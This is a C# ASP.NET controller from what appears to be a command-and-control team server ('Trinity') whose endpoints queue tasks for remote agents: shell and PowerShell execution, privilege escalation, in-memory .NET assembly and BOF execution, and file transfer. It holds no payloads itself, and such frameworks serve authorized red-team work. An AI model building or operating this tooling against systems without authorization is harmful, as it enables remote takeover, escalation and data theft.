//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ BEGINNING OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
using Microsoft.AspNetCore.Mvc;
using TeamServer.Controllers;
using TeamServer.Services;
using Trinity.Shared.DTOs.Command;
using Trinity.Shared.Interfaces;
using Trinity.Shared.Enums;
namespace TeamServer.Controllers
{
    [Route(Routes.Commands)]
    [ApiController]
    public class CommandController : ControllerBase
    {
        private CommandService _commandService;

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Default constructor.
        /// </summary>
        public CommandController(CommandService commandService)
        {
            this._commandService = commandService;
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Queues a PowerShell task for the specified agent and returns the asynchronous command response.
        /// </summary>
        /// <remarks>Uses the command service to enqueue the task; the response contains the assigned
        /// TaskID when successful.</remarks>
        /// <param name="agentId">Target agent identifier.</param>
        /// <param name="powershellDTO">Payload describing the PowerShell command and execution options.</param>
        /// <returns>An IActionResult containing an AsyncCommandResponseDTO. Returns 200 OK with the response when the task is
        /// queued and 400 Bad Request if the task could not be created.</returns>
        [HttpPost("{agentId}/spawn/powershell")]
        public async Task<IActionResult> QueuePowerShellCommand([FromRoute] int agentId, PowerShellDTO powershellDTO)
        {
            var response = await this._commandService.QueueTaskAsync(powershellDTO, CommandTypes.Powershell, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        /// <summary>
        /// Execute a command using shell.
        /// </summary>
        /// <param name="agentId"></param>
        /// <param name="shellDTO"></param>
        /// <returns></returns>
        [HttpPost("{agentId}/spawn/shell")]
        public async Task<IActionResult> QueueShellCommand([FromRoute] int agentId, ShellDTO shellDTO)
        {
            var response = await this._commandService.QueueTaskAsync(shellDTO, CommandTypes.Shell, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/runas")]
        public async Task<IActionResult> QueueRunAsCommand([FromRoute] int agentId, RunAsDTO runAsDTO)
        {
            var response = await this._commandService.QueueTaskAsync(runAsDTO, CommandTypes.RunAs, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/run")]
        public async Task<IActionResult> QueueRunCommand([FromRoute] int agentId, RunDTO runDTO)
        {
            var response = await this._commandService.QueueTaskAsync(runDTO, CommandTypes.Run, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/runu")]
        public async Task<IActionResult> QueueRunUCommand([FromRoute] int agentId, RunUDTO runUDTO)
        {
            var response = await this._commandService.QueueTaskAsync(runUDTO, CommandTypes.RunU, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/killprocess")]
        public async Task<IActionResult> QueueKillCommand([FromRoute] int agentId, KillProcessDTO killProcessDTO)
        {
            var response = await this._commandService.QueueTaskAsync(killProcessDTO, CommandTypes.Kill, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/escalate")]
        public async Task<IActionResult> QueueEscalateCommand([FromRoute] int agentId, EscalateDTO escalateDTO)
        {
            var response = await this._commandService.QueueTaskAsync(escalateDTO, CommandTypes.Escalate, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/spawn/dotnetassembly")]
        public async Task<IActionResult> QueueDotNetAsmCommand([FromRoute] int agentId, DotNetAsmDTO dotNetAsmDTO)
        {
            var response = await this._commandService.QueueTaskAsync(dotNetAsmDTO, CommandTypes.ExecuteAssembly, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/bof")]
        public async Task<IActionResult> QueueBofCommand([FromRoute] int agentId, BofDTO bofDTO)
        {
            var response = await this._commandService.QueueTaskAsync(bofDTO, CommandTypes.BOF, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/filedownload")]
        public async Task<IActionResult> QueueFileDownloadCommand([FromRoute] int agentId, DownloadDTO downloadDTO)
        {
            var response = await this._commandService.QueueTaskAsync(downloadDTO, CommandTypes.Download, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/cancelFileDownload")]
        public async Task<IActionResult> QueueCancelFileDownloadCommand([FromRoute] int agentId, CancelDownloadDTO cancelDownloadDTO)
        {
            var response = await this._commandService.QueueTaskAsync(cancelDownloadDTO, CommandTypes.CancelDownload, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/upload")]
        public async Task<IActionResult> QueueUploadCommand([FromRoute] int agentId, UploadDTO uploadDTO)
        {
            var response = await this._commandService.QueueTaskAsync(uploadDTO, CommandTypes.Upload, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/spawnto")]
        public async Task<IActionResult> QueueSpawnToCommand([FromRoute] int agentId, SpawnToDTO spawnToDTO)
        {
            var response = await this._commandService.QueueTaskAsync(spawnToDTO, CommandTypes.SpawnTo, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/updatehosts")]
        public async Task<IActionResult> QueueUpdateHostsCommand([FromRoute] int agentId, UpdateHostsDTO updateHostsDTO)
        {
            var response = await this._commandService.QueueTaskAsync(updateHostsDTO, CommandTypes.UpdateHosts, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/setsleep")]
        public async Task<IActionResult> QueueSetSleepCommand([FromRoute] int agentId, SetSleepDTO setSleepDTO)
        {
            var response = await this._commandService.QueueTaskAsync(setSleepDTO, CommandTypes.SetSleep, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }

        //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
        [HttpPost("{agentId}/execute/kill")]
        public async Task<IActionResult> QueueKillAgentCommand([FromRoute] int agentId, KillAgentDTO killAgentDTO)
        {
            var response = await this._commandService.QueueTaskAsync(killAgentDTO, CommandTypes.KillAgent, agentId);
            return response.IsSuccess ? Created() : BadRequest(response.Error);
        }
    }
}
//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^{ END OF FILE }^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//